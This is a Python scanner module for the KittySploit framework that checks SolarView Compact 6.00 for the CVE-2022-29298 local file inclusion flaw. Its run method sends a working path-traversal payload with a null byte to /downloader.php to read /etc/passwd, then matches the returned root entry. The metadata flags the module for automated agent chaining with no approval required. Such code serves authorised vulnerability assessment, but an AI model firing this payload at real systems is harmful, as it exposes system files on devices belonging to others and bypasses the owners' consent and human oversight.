#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SolarView Compact 6."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SolarView Compact 6.00 - Local File Inclusion Detection',
        'description': 'SolarView Compact 6.00 is vulnerable to local file inclusion which could allow attackers to access sensitive files.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'lfi', 'solarview', 'edb', 'contec', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/50950',
            'https://drive.google.com/file/d/1-RHw9ekVidP8zc0xpbzBXnse2gSY1xbH/view',
            'https://drive.google.com/file/d/1-RHw9ekVidP8zc0xpbzBXnse2gSY1xbH/view?usp=sharing',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-29298',
            'https://github.com/20142995/pocsuite3',
        ],
        'cve': 'CVE-2022-29298',
    }

    def run(self):
        r = self.http_request(method="GET", path='/downloader.php?file=../../../../../../../../../../../../../etc/passwd%00.jpg', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="SolarView Compact 6.00 - Local File Inclusion detected",
                path='/downloader.php?file=../../../../../../../../../../../../../etc/passwd%00.jpg',
            )
            return True
        return False

